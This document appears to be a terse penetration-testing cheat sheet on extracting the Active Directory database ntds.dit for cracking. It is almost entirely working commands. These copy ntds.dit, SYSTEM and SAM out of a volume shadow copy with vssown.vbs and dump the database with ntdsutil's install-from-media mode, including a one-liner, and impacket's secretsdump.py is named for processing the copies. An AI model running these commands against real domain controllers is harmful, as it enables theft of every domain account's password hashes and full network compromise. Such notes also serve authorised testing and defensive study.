# Crack ntds.dit
%systemroot%\ntds\ntds.dit 
impacket secretsdump.py

## Grab with VSS (Volume Shadow Copy)
cscript vssown.vbs /status 
cscript vssown.vbs /start 
cscript vssown.vbs /create /c 
### X = # associated 
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy[X]\windows\ntds\ntds.dit ntdsbackup.dit 
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy[X]\windows\system32\config\SYSTEM systembackup.bak 
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy[X]\windows\system32\config\SAM sambackup.bak
cscript vssown.vbs /stop 
## Grab with IFM (Install from Media)
ntdsutil
activate instance ntdsifm
create full C:\mybackup
quit 
quit 
### One Liner
ntdsutil "ac in ntds" "ifm" "cr fu C:\temp" q q 